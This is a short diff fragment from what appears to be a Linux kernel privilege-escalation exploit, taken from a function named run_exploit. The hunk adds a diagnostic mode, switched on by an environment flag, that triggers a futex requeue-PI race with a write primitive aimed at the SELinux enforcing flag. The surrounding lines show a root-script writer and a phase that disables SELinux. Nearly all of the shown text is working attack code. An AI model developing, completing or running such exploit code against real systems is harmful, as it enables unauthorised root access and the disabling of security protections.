@@ -413,6 +413,17 @@ int run_exploit(int argc, char **argv) {
   timer_reset();
   TIMER("exploit start");
 
+  if (env_flag("DIAG_FUTEX_ONLY", 0)) {
+    pr_info("DIAG_FUTEX_ONLY: testing futex requeue PI without heap spray\n");
+    pselect_child_node = 1;
+    set_pselect_write_mode(data_addr(SELINUX_ENFORCING), 0, 1);
+    pr_info("DIAG: starting futex threads\n");
+    run_main_route_threads();
+    pr_info("DIAG: run_main_route_threads returned OK\n");
+    clear_pselect_write();
+    return 0;
+  }
+
   write_root_script();
 
   /* Phase 1: Disable SELinux */
